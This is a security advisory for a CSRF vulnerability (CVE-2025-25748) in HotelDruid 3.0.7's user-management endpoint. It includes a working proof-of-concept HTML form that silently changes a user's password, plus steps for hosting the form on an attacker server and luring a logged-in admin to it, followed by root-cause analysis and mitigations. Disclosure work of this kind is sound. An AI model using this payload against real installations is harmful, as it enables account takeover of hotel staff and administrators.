# CVE-2025-25748-Cross-Site-Request-Forgery-CSRF-Vulnerability-in-HotelDruid-3.0.7

## Description

A Cross Site Request Forgery (CSRF) vulnerability in the gestione_utenti.php endpoint of HotelDruid 3.0.7 allows attackers to perform unauthorized actions (e.g., modifying user passwords) on behalf of authenticated users by exploiting the lack of origin or referer validation and the absence of CSRF tokens.

---

## Impact

- **Unauthorized Password Changes:** Attackers can overwrite user passwords, leading to complete account takeover.
- **Session Riding:** The attacker can leverage the victim’s active session to make unauthorized administrative changes.
- **Data Breach Risk:** If administrative accounts are compromised, sensitive user and operational data may be exposed or altered.

This vulnerability exposes all user accounts — including administrative ones — to unauthorized changes without the user’s consent.

---

## Proof of Concept (PoC)

### PoC HTML Form

The following malicious form demonstrates how an attacker can force a logged-in administrator to change the password of user ID 2 to `maliciouspassword`:

```html
<form method="POST" action="http://localhost/hoteldruid/gestione_utenti.php">    <input type="hidden" name="anno" value="2025">    <input type="hidden" name="id_sessione" value="20250118062407or6tODG42f79QvMA2429">    <input type="hidden" name="modifica_pass" value="SI">    <input type="hidden" name="id_utente_pass" value="2">    <input type="hidden" name="prima_pass" value="maliciouspassword">    <input type="hidden" name="seconda_pass" value="maliciouspassword">    <button type="submit">Submit</button></form>
```

### Hosting and Launching the Attack

Save the above code as `csrf_attack.html`.

Serve it using Python (attacker-controlled server):

```bash
python3 -m http.server 8080
```

Direct the victim to:

```
http://<attacker-ip>:8080/csrf_attack.html
```

Once submitted, the form sends the request to HotelDruid, changing the password of user ID 2 to `maliciouspassword`, using the victim’s active session.

---

## Analysis

### Background

HotelDruid is a widely-used open-source property management system for hotels and vacation rentals. As a multi-user system with administrative controls for user management, ensuring that only authorized users can modify account credentials is critical for overall system security.

CSRF vulnerabilities exploit the trust a server places in a user’s browser session. If a victim is logged in and visits a malicious page, the page can silently submit unauthorized requests to the vulnerable application using the victim’s active session. In HotelDruid, the lack of CSRF defenses on critical actions — like changing user passwords — allows attackers to fully compromise accounts without user interaction beyond visiting a malicious link.

---

## Vulnerability Details

### Affected Endpoint

- `gestione_utenti.php`

### Affected Parameters

- `modifica_pass`
- `id_utente_pass`
- `prima_pass`
- `seconda_pass`

### Root Cause

- No anti-CSRF token is present in the form or validated server-side.
- No validation of the `Origin` or `Referer` headers is performed.
- The application blindly trusts incoming POST requests, including those originating from external sites.

### Exploitation Flow

1. Attacker prepares a malicious HTML form with pre-filled hidden fields targeting `gestione_utenti.php`.
2. Attacker tricks a logged-in HotelDruid user (e.g., admin) into visiting the malicious page.
3. Upon visiting, the form automatically submits, sending a valid request to change a user’s password to a value controlled by the attacker.
4. The victim’s session is used to authorize the request, without their knowledge or consent.

---

## Impact

- **Account Takeover:** Any user’s password (including admin accounts) can be changed without their knowledge, giving the attacker full access.
- **Privilege Escalation:** Attackers could escalate privileges if they can first compromise a lower-level user and then pivot using administrative actions.
- **Data Integrity Risks:** Attackers can modify user accounts, potentially locking out legitimate users or creating backdoor access.

---

## Mitigation / Patching

### Recommendations for Developers

### Anti-CSRF Tokens

- Implement and enforce unique anti-CSRF tokens for all state-changing forms and requests.
- Verify tokens server-side before processing requests.

### Referer/Origin Header Validation

- Validate `Referer` and `Origin` headers to ensure requests come from trusted origins.

### Limit Sensitive Operations via GET Requests

- Password changes and similar actions should be restricted to POST requests only.
- Avoid passing sensitive session data (like `id_sessione`) in the URL.

### Session Management Enhancements

- Regenerate session tokens after login.
- Bind session tokens to IP addresses or browser fingerprints, where feasible.

### User Notification

- Notify users (email or in-app alert) when sensitive actions like password changes occur.

---

## Timeline and Credits

- **Discovery Date:** January 16, 2025
- **Vendor Notification:** January 17, 2025
- **MITRE CVE Assignment:** CVE-2025-25748, February 27 2025
- **Public Disclosure:** March 7, 2025
- **Researcher:** Huy Vo (Security Researcher)
